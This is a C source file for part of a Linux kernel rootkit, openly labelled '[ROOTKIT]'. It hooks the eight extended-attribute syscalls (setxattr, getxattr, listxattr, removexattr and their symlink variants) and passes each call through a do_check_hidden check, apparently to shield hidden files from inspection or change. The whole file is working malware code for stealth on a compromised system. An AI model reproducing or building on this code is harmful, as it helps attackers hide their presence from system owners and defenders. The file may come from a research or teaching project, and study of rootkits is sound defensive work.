#include "hooking.h"
#include "macro_utils.h"
#include "syscall_hooks.h"
#include <linux/fcntl.h>
#include <linux/printk.h>
#include <linux/types.h>
#include <linux/uaccess.h>

// sys_setxattr syscall hook handler
SYSCALL_HOOK_HANDLER5(setxattr, orig_setxattr, p_regs, const char __user *, s_pathname,
                      const char __user *, s_name, const void __user *, p_value, size_t, sz_size,
                      int, i32_flags)
{
    pr_info("[ROOTKIT] setxattr(%p, %p, %p, %zu, %s%#x)\n", s_pathname, s_name, p_value, sz_size,
            SIGNED_ARG(i32_flags));

    return do_check_hidden(orig_setxattr, p_regs, AT_FDCWD, s_pathname, 0);
}

// sys_lsetxattr syscall hook handler
SYSCALL_HOOK_HANDLER5(lsetxattr, orig_lsetxattr, p_regs, const char __user *, s_pathname,
                      const char __user *, s_name, const void __user *, p_value, size_t, sz_size,
                      int, i32_flags)
{
    pr_info("[ROOTKIT] lsetxattr(%p, %p, %p, %zu, %s%#x)\n", s_pathname, s_name, p_value, sz_size,
            SIGNED_ARG(i32_flags));

    return do_check_hidden(orig_lsetxattr, p_regs, AT_FDCWD, s_pathname, AT_SYMLINK_NOFOLLOW);
}

// sys_getxattr syscall hook handler
SYSCALL_HOOK_HANDLER4(getxattr, orig_getxattr, p_regs, const char __user *, s_pathname,
                      const char __user *, s_name, void __user *, p_value, size_t, sz_size)
{
    pr_info("[ROOTKIT] getxattr(%p, %p, %p, %zu)\n", s_pathname, s_name, p_value, sz_size);

    return do_check_hidden(orig_getxattr, p_regs, AT_FDCWD, s_pathname, 0);
}

// sys_lgetxattr syscall hook handler
SYSCALL_HOOK_HANDLER4(lgetxattr, orig_lgetxattr, p_regs, const char __user *, s_pathname,
                      const char __user *, s_name, void __user *, p_value, size_t, sz_size)
{
    pr_info("[ROOTKIT] lgetxattr(%p, %p, %p, %zu)\n", s_pathname, s_name, p_value, sz_size);

    return do_check_hidden(orig_lgetxattr, p_regs, AT_FDCWD, s_pathname, AT_SYMLINK_NOFOLLOW);
}

// sys_listxattr syscall hook handler
SYSCALL_HOOK_HANDLER3(listxattr, orig_listxattr, p_regs, const char __user *, s_pathname,
                      char __user *, s_list, size_t, sz_size)
{
    pr_info("[ROOTKIT] listxattr(%p, %p, %zu)\n", s_pathname, s_list, sz_size);

    return do_check_hidden(orig_listxattr, p_regs, AT_FDCWD, s_pathname, 0);
}

// sys_llistxattr syscall hook handler
SYSCALL_HOOK_HANDLER3(llistxattr, orig_llistxattr, p_regs, const char __user *, s_pathname,
                      char __user *, s_list, size_t, sz_size)
{
    pr_info("[ROOTKIT] llistxattr(%p, %p, %zu)\n", s_pathname, s_list, sz_size);

    return do_check_hidden(orig_llistxattr, p_regs, AT_FDCWD, s_pathname, AT_SYMLINK_NOFOLLOW);
}

// sys_removexattr syscall hook handler
SYSCALL_HOOK_HANDLER2(removexattr, orig_removexattr, p_regs, const char __user *, s_pathname,
                      const char __user *, s_name)
{
    pr_info("[ROOTKIT] removexattr(%p, %p)\n", s_pathname, s_name);

    return do_check_hidden(orig_removexattr, p_regs, AT_FDCWD, s_pathname, 0);
}

// sys_lremovexattr syscall hook handler
SYSCALL_HOOK_HANDLER2(lremovexattr, orig_lremovexattr, p_regs, const char __user *, s_pathname,
                      const char __user *, s_name)
{
    pr_info("[ROOTKIT] lremovexattr(%p, %p)\n", s_pathname, s_name);

    return do_check_hidden(orig_lremovexattr, p_regs, AT_FDCWD, s_pathname, AT_SYMLINK_NOFOLLOW);
}
